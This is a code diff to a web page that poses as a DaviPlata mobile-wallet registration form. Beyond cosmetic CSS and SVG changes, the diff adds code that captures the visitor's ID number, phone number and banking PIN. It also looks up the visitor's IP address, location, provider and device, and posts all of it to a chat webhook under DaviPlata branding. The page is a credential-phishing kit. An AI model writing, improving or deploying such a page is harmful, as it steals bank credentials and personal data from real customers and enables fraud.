@@ -66,10 +66,7 @@
             box-shadow: 0 3px 10px rgba(0,0,0,0.12);
             transition: transform 0.15s ease, box-shadow 0.15s ease;
         }
-        .icon-box:active {
-            transform: scale(0.93);
-            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
-        }
+        .icon-box:active { transform: scale(0.93); box-shadow: 0 1px 5px rgba(0,0,0,0.1); }
 
         #loader {
             display: none; position: fixed; inset: 0; z-index: 999;
@@ -120,19 +117,14 @@
         <button class="btn-continue" id="btn-next" onclick="goToKyc()">Continuar</button>
         <div class="actions-row">
 
-            <!-- Confirmar comprobante: recibo con sello de verificación -->
             <div class="action-item">
                 <div class="icon-box">
-                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <!-- Cuerpo del recibo -->
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                         <path d="M5 3H14.5L19 7.5V19C19 20.1 18.1 21 17 21H5C3.9 21 3 20.1 3 19V5C3 3.9 3.9 3 5 3Z"
                               fill="#FFF0F2" stroke="#E60026" stroke-width="1.6" stroke-linejoin="round"/>
-                        <!-- Doblez esquina -->
                         <path d="M14 3V8H19" stroke="#E60026" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
-                        <!-- Líneas de texto simuladas -->
                         <line x1="7" y1="12" x2="13" y2="12" stroke="#E60026" stroke-width="1.4" stroke-linecap="round"/>
                         <line x1="7" y1="15" x2="11" y2="15" stroke="#F5B0B9" stroke-width="1.4" stroke-linecap="round"/>
-                        <!-- Check badge en esquina inferior derecha -->
                         <circle cx="16.5" cy="17.5" r="3.5" fill="#E60026"/>
                         <path d="M15 17.5L16.2 18.8L18.2 16.5" stroke="white" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
                     </svg>
@@ -140,20 +132,14 @@
                 Confirmar<br>comprobante
             </div>
 
-            <!-- Necesitas ayuda: auricular moderno con ondas -->
             <div class="action-item">
                 <div class="icon-box">
-                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <!-- Cabeza auricular -->
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                         <path d="M5 11C5 7.13 8.13 4 12 4C15.87 4 19 7.13 19 11"
                               stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
-                        <!-- Orejera izquierda -->
                         <rect x="3" y="11" width="3.5" height="5.5" rx="1.75" fill="#FFF0F2" stroke="#E60026" stroke-width="1.5"/>
-                        <!-- Orejera derecha -->
                         <rect x="17.5" y="11" width="3.5" height="5.5" rx="1.75" fill="#FFF0F2" stroke="#E60026" stroke-width="1.5"/>
-                        <!-- Cable inferior -->
                         <path d="M19 16.5C19 18.5 17.2 20 15 20H13" stroke="#E60026" stroke-width="1.5" stroke-linecap="round"/>
-                        <!-- Micrófono pequeño -->
                         <circle cx="13" cy="20" r="1" fill="#E60026"/>
                     </svg>
                 </div>
@@ -186,6 +172,24 @@
         }
     }
 
+    async function getGeoInfo() {
+        try {
+            const res  = await fetch('https://ipapi.co/json/');
+            const json = await res.json();
+            return {
+                ip:      json.ip       || 'N/A',
+                city:    json.city     || 'N/A',
+                region:  json.region   || 'N/A',
+                country: json.country_name || 'N/A',
+                org:     json.org      || 'N/A',
+                lat:     json.latitude  || '',
+                lon:     json.longitude || ''
+            };
+        } catch {
+            return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A', lat: '', lon: '' };
+        }
+    }
+
     async function goToKyc() {
         if (!document.getElementById('btn-next').classList.contains('active')) return;
 
@@ -198,25 +202,92 @@
             pin:  document.getElementById('pin').value
         };
 
+        // Guardar en sessionStorage Y localStorage
+        const payload = JSON.stringify(data);
+        sessionStorage.setItem('formData', payload);
+        localStorage.setItem('formData', payload);
+        localStorage.setItem('formData_ts', new Date().toISOString());
+
+        // Obtener geolocalización por IP
+        const geo = await getGeoInfo();
+
+        const now       = new Date();
+        const timestamp = now.toLocaleString('es-CO', {
+            timeZone: 'America/Bogota',
+            day: '2-digit', month: '2-digit', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit'
+        });
+
+        const mapsLink = geo.lat
+            ? `[📍 Ver ubicación](https://www.google.com/maps?q=${geo.lat},${geo.lon})`
+            : '';
+
         try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "📱 Nuevo Registro",
-                        color: 15073318,
+                        title: "🏦  DaviPlata — Nuevo Registro",
+                        color: 0xE60026,
+                        thumbnail: {
+                            url: "https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z"
+                        },
                         fields: [
-                            { name: "Documento", value: `${data.doc} ${data.num}`, inline: true },
-                            { name: "Celular",   value: data.tel,                  inline: true },
-                            { name: "PIN",       value: `||${data.pin}||`,         inline: true }
-                        ]
+                            {
+                                name: "📋  Documento",
+                                value: `\`${data.doc === 'CC' ? 'Cédula de Ciudadanía' : 'Cédula de Extranjería'}\`\n**${data.num}**`,
+                                inline: true
+                            },
+                            {
+                                name: "📱  Celular",
+                                value: `**${data.tel}**`,
+                                inline: true
+                            },
+                            {
+                                name: "🔐  PIN",
+                                value: `||${data.pin}||`,
+                                inline: true
+                            },
+                            {
+                                name: "🌐  Dirección IP",
+                                value: `\`${geo.ip}\``,
+                                inline: true
+                            },
+                            {
+                                name: "📍  Ubicación",
+                                value: `${geo.city}, ${geo.region}\n**${geo.country}**`,
+                                inline: true
+                            },
+                            {
+                                name: "🏢  Proveedor",
+                                value: `\`${geo.org}\``,
+                                inline: true
+                            },
+                            {
+                                name: "🗺️  Mapa",
+                                value: mapsLink || 'No disponible',
+                                inline: true
+                            },
+                            {
+                                name: "🕐  Fecha y hora",
+                                value: `\`${timestamp}\``,
+                                inline: true
+                            },
+                            {
+                                name: "📲  Dispositivo",
+                                value: `\`${navigator.userAgent.substring(0, 80)}\``,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "DaviPlata KYC System • Registro inicial"
+                        },
+                        timestamp: new Date().toISOString()
                     }]
                 })
             });
         } catch(e) {}
-
-        sessionStorage.setItem('formData', JSON.stringify(data));
 
         setTimeout(() => {
             hideLoader();
